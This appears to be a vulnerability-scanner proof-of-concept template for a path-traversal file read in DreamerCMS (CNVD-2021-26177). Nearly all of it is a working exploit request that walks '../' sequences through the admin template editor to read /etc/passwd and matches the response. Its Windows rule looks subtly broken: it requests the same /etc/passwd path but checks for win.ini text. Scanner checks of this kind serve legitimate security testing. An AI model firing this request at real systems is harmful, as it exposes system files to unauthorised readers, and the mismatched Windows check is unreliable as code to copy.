name: poc-yaml-dreamercms-cnvd-2021-26177-fileread
binding: e693c2a9-41f6-44c5-9f79-05a870d96441
manual: true
detail:
    author: xxtx
    links:
        - https://www.cnvd.org.cn/flaw/show/CNVD-2021-26177
    vulnerability:
        id: CT-517491
        level: high
transport: http
rules:
    linux:
        request:
            cache: true
            method: GET
            path: ^/admin/templates/toEdit?path=templates/default&file=../../../../../../../../../../../../../etc/passwd
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    windows:
        request:
            cache: true
            method: GET
            path: ^/admin/templates/toEdit?path=templates/default&file=../../../../../../../../../../../../../etc/passwd
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: linux() || windows()
